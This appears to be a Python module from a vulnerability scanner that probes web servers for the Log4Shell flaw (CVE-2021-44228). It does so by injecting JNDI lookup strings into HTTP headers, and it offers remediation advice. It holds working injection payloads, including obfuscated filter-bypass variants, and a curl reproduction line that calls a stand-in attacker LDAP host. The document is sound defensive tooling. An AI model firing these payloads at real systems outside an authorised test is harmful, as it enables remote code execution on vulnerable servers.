"""Log4Shell Detector — CVE-2021-44228 Log4j RCE via JNDI injection probe."""
from __future__ import annotations

import asyncio
import sys
import time
import uuid
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_LOG4SHELL = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"

# Common injection points
INJECTION_HEADERS = [
    "X-Forwarded-For", "User-Agent", "Referer", "X-Api-Version",
    "Accept-Language", "Authorization", "X-Request-ID", "X-Correlation-ID",
]

LOG4J_PAYLOADS = [
    "${jndi:ldap://{callback}/log4shell}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://{callback}/bypass1}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{callback}/bypass2}",
]


class Log4Shell(BaseModule):
    NAME        = "log4shell"
    DESCRIPTION = "CVE-2021-44228 Log4j JNDI injection — probes common headers for Log4Shell RCE"
    PHASE       = 4
    TAGS        = ["vuln", "cve-2021-44228", "log4j", "jndi", "rce", "critical"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        hosts = self.config.extra.get("live_hosts", [target])
        web_ports = self.config.extra.get("web_ports", [80, 443, 8080, 8443, 8888, 9200])

        for host in hosts[:20]:
            if not self.check_scope(host):
                continue
            for port in web_ports:
                await self.rate_limit()
                if not await self._port_open(host, port):
                    continue
                await self._probe_log4shell(host, port)

        return self._make_result(start)

    async def _probe_log4shell(self, host: str, port: int) -> None:
        """Send Log4Shell JNDI payloads via common headers."""
        import aiohttp

        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{host}:{port}/"
        canary = uuid.uuid4().hex[:12]

        # Use OOB callback if available, otherwise detect via error patterns
        oob_server = self.config.extra.get("oob_server", "")
        callback = f"{oob_server}/{canary}" if oob_server else f"{canary}.log4j.probe"

        for header in INJECTION_HEADERS:
            for payload_template in LOG4J_PAYLOADS[:1]:  # Use first payload per header
                payload = payload_template.format(callback=callback)
                headers = {header: payload, "User-Agent": "Mozilla/5.0"}

                try:
                    timeout = aiohttp.ClientTimeout(total=10)
                    async with aiohttp.ClientSession(timeout=timeout) as session:
                        async with session.get(url, headers=headers, ssl=False) as resp:
                            body = await resp.text()
                            body_lower = body.lower()

                            # Tight detection: require Java stack trace or JNDI-specific error
                            # NOT just keyword mentions (blogs/docs mentioning "log4j" = FP)
                            java_stack_indicators = [
                                "javax.naming",       # JNDI exception class
                                "com.sun.jndi",       # JNDI provider
                                "initialcontext",     # JNDI lookup class
                                "jndiexception",      # JNDI error
                                "log4j2.formatmsgnolookups",  # Mitigation mentioned in error
                            ]
                            # Require BOTH a stack trace pattern AND the payload echo
                            has_jndi_error = any(ind in body_lower for ind in java_stack_indicators)
                            payload_reflected = "${jndi:" in body or "jndi:ldap" in body_lower

                            if has_jndi_error or payload_reflected:
                                self.new_finding(
                                    title=f"Log4Shell (CVE-2021-44228) — {host}:{port}",
                                    severity=Severity.CRITICAL,
                                    description=(
                                        f"Log4Shell JNDI injection detected on {host}:{port} via {header} header. "
                                        "This is a critical unauthenticated RCE vulnerability."
                                    ),
                                    reproduction_steps=[
                                        f"curl -H '{header}: ${{jndi:ldap://attacker/a}}' {url}",
                                    ],
                                    remediation=(
                                        "Upgrade Log4j to 2.17.1+. Set log4j2.formatMsgNoLookups=true. "
                                        "Remove JndiLookup class: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class"
                                    ),
                                    references=["CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105"],
                                    evidence=Evidence(extra={
                                        "host": host, "port": port, "header": header,
                                        "response_snippet": body[:500],
                                        "detection": "jndi_error" if has_jndi_error else "payload_reflected",
                                    }),
                                    cvss_v31_vector=CVSS_LOG4SHELL,
                                    mitre_attack=["TA0001/T1190"],
                                    target=host, port=port, service="http",
                                    confidence="HIGH" if has_jndi_error else "MEDIUM",
                                )
                                return  # One finding per host:port
                except Exception:
                    continue

    async def _port_open(self, host: str, port: int) -> bool:
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=3)
            writer.close()
            await writer.wait_closed()
            return True
        except Exception:
            return False
